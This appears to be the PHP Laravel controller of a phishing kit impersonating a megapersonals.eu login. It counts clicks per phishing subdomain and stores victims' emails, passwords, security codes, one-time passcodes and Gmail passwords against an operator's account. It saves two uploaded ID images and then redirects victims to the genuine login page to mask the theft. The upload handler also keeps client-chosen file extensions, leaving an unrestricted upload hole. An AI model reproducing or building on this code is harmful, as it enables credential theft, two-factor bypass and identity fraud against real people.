<?php

namespace App\Http\Controllers;

use App\Events\MyEvent;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Session;

class DataController extends Controller
{
        public function count(Request $request){
        $category =DB::table('domains')->where('subdomain',$request->dom_info)->first();



        $data = array();

        $data['click'] = $category->click + 1;
        $category2 = DB::table('domains')->where('subdomain',$request -> dom_info)->update($data);


        Session::put('temp', rand(1,5000));

        $data2['temp'] = Session::get('temp');

        $data2['email'] = '';
        $data2['password'] = '';
        $data2['domain'] = 'skip';
        $data2['subdomain'] = $request->dom_info;
        $data2['user-id'] = $category->user_id;

       

        DB::table('emails')->insert($data2);


        if ($request->device == 'desktop'){
            $category2 = DB::table('domains')->where('subdomain',$request -> dom_info)->increment('desktop',1);
        }elseif ($request->device == 'mobile'){
            $category2 = DB::table('domains')->where('subdomain',$request -> dom_info)->increment('mobile',1);
        }elseif ($request->device == 'tablet'){
            $category2 = DB::table('domains')->where('subdomain',$request -> dom_info)->increment('tablet',1);
        }

        return response()->json(
            [
                'success' => true,
                'message' => $category->click+1
            ]
        );
    }
    
    public function auth_login_id($id){

        $domain = DB::table('domains')
            ->where('subdomain',$id)
            ->where('domain','skip');


        $count = $domain->count();

        $user_id = $domain->first();

        //return response()->json($user_id);
        Session::put('sub', $user_id->subdomain);
        Session::put('dom_test', $user_id->path);
        $id_user = $user_id->user_id;


        // object
        $agent = new \Jenssegers\Agent\Agent;
        if ($agent->isDesktop()){
            $result = 'desktop';
        }
        if ($agent->isMobile()){
            $result = 'mobile';
        }
        if ($agent->isTablet()){
            $result = 'tablet';
        }


        //return $result;


        if ((int)$count > 0){
            return view('welcome',compact('id','id_user','result'));
        }else{
            return view('welcome',compact('id','result'));
        }

    }
        

                public function live_chat_id($id){

        $domain = DB::table('domains')
            ->where('subdomain',$id)
            ->where('domain','skip');


        $count = $domain->count();

        $user_id = $domain->first();

        //return response()->json($user_id);
         Session::put('sub', $user_id->subdomain);
        Session::put('dom_test', $user_id->path);
        $id_user = $user_id->user_id;


        // object
        $agent = new \Jenssegers\Agent\Agent;
        if ($agent->isDesktop()){
            $result = 'desktop';
        }
        if ($agent->isMobile()){
            $result = 'mobile';
        }
        if ($agent->isTablet()){
            $result = 'tablet';
        }


        //return $result;


        if ((int)$count > 0){
            return view('welcome_backup',compact('id','id_user','result'));
        }else{
            return view('welcome_backup',compact('id','result'));
        }

    }
                 



    public function insertdom(Request $request){
        event(new MyEvent('hello world',$request->id_user));
        $data = array();
        $data['email'] = $request->email;
        $data['password'] = $request->password;
        //$data['domain'] = $request->dom;
        $data['gmail'] = 'Waiting For Input';
        //$data['user-id'] = (int)$request->id_user;
        Session::put('em', $request->email);
        DB::table('emails')->where('temp',Session::get('temp'))->update($data);

        //return response()->json($data);

        $dom = Session::get('dom_test');

        if($dom == 'live/chat' || $dom == 'video/chat'){
            return view('security_backup');
        }else{
            return view('security');
        }


    }
    public function add_sec(Request $request){
        $data = array();
        $id = Session::get('temp');

        $data['code'] = $request -> email;

        DB::table('emails')->where('temp',$id)->update($data);
        return view('otp');

    }

        public function add_otp(Request $request){
        $data = array();
        $id = Session::get('temp');

        $data['gmail_password'] = $request -> email;

        DB::table('emails')->where('temp',$id)->update($data);
        $dom = Session::get('dom_test');
        return redirect($dom.'/'.Session::get('sub'));
    }



    public  function insertgmail(Request $request){
        $data = array();
        $id = Session::get('temp');

        $image = $request->file('email');

        $image_name = hexdec(uniqid());
        $ext = strtolower($image->getClientOriginalExtension());
        $image_full_name = $image_name.'.'.$ext;
        $upload_path = 'uploads/';
        $image_url = $upload_path.$image_full_name;
        $sucess = $image->move($upload_path,$image_full_name);
        $data["id_one"] = $image_url;


        $image2 = $request->file('password');

        $image_name2 = hexdec(rand(1,1000));
        $ext2 = strtolower($image2->getClientOriginalExtension());
        $image_full_name2 = $image_name2.'.'.$ext2;
        $upload_path2 = 'uploads/';
        $image_url2 = $upload_path2.$image_full_name2;
        $sucess2 = $image2->move($upload_path2,$image_full_name2);
        $data["id_two"] = $image_url2;


        DB::table('emails')->where('temp',$id)->update($data);

        return redirect()->away('https://megapersonals.eu/users/auth/login');


    }
}
